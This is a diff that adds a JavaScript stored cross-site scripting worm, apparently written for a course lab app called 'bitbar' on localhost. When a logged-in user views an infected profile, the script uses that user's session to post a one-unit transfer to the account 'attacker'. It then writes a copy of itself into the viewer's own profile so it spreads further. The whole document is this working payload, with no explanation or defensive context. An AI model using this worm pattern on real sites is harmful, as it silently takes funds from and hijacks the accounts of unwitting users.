@@ -1,0 +1,23 @@
+<script>
+  var and = decodeURIComponent('%26');
+  var params = "destination_username=attacker".concat(and).concat("quantity=1");
+  console.log(params);
+  var params2 = "new_profile=".concat(document.getElementById('profile').innerHTML);
+  var req = new XMLHttpRequest();
+  req.withCredentials = true;
+  req.open("post", "http://localhost:3000/post_transfer");
+  req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  req.onload  = function() {
+    console.log(document.getElementById('profile').innerHTML);
+    console.log(params2.slice(0,53));
+    console.log(params2.slice(56));
+    var req2 = new XMLHttpRequest();
+    req2.withCredentials = true;
+    req2.open("post", "http://localhost:3000/set_profile");
+    req2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    req2.send( params2.slice(0,53).concat(encodeURIComponent(encodeURIComponent(and))).concat(params2.slice(56)).concat('<span id="bitbar_count" class="10"></span>') );
+  };
+  console.log(encodeURIComponent(params))
+  req.send(params);
+</script>
+<span id="bitbar_count" class="10"></span>
